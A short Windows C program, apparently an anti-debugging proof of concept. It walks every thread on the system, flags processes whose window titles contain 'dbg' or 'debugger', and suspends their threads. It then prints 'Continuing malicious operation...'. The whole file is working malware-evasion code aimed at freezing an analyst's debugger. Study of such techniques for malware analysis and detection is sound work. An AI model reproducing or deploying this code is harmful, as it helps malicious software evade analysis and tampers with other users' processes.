#include <windows.h>
#include <string.h>
#include <wchar.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD g_dwDebuggerProcessId = -1;

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM dwProcessId)
{
    DWORD dwWindowProcessId;
    GetWindowThreadProcessId(hwnd, &dwWindowProcessId);

    if (dwProcessId == dwWindowProcessId)
    {
		int windowTitleSize = GetWindowTextLengthW(hwnd);
		if ( windowTitleSize <= 0 )
		{
			return TRUE;
		}
		wchar_t* windowTitle = (wchar_t*)malloc((windowTitleSize + 1) * sizeof(wchar_t));
		
        GetWindowTextW(hwnd, windowTitle, windowTitleSize + 1);

		if (wcsstr(windowTitle, L"dbg") != 0 ||
			wcsstr(windowTitle, L"debugger") != 0 )
		{
            g_dwDebuggerProcessId = dwProcessId;
			return FALSE;
		}
 
       return FALSE;
    }

    return TRUE;
}

DWORD IsDebuggerProcess(DWORD dwProcessId)
{
    EnumWindows(EnumWindowsProc, (LPARAM)dwProcessId);
    return g_dwDebuggerProcessId == dwProcessId;
}

DWORD SuspendDebuggerThread()
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
	{
        printf("Failed to create snapshot\n");
        return 1;
    }

    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);

    if (!Thread32First(hSnapshot, &te32))
	{
        printf("Failed to get first thread\n");
        CloseHandle(hSnapshot);
        return 1;
    }

    do
	{
        HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION | THREAD_SUSPEND_RESUME, FALSE, te32.th32ThreadID);
        if (hThread != NULL)
		{
            DWORD dwProcessId = GetProcessIdOfThread(hThread);
			if ( IsDebuggerProcess(dwProcessId) )
			{
				printf("Debugger found with pid %i! Suspending!\n", dwProcessId);
				DWORD result = SuspendThread(hThread);
 				if ( result == -1 )
				{
					printf("Last error: %i\n", GetLastError());
				}
			}
            CloseHandle(hThread);
        }
    } while (Thread32Next(hSnapshot, &te32));

    CloseHandle(hSnapshot);

    return 0;
}

int main(void)
{
	SuspendDebuggerThread();

	printf("Continuing malicious operation...");
	getchar();
}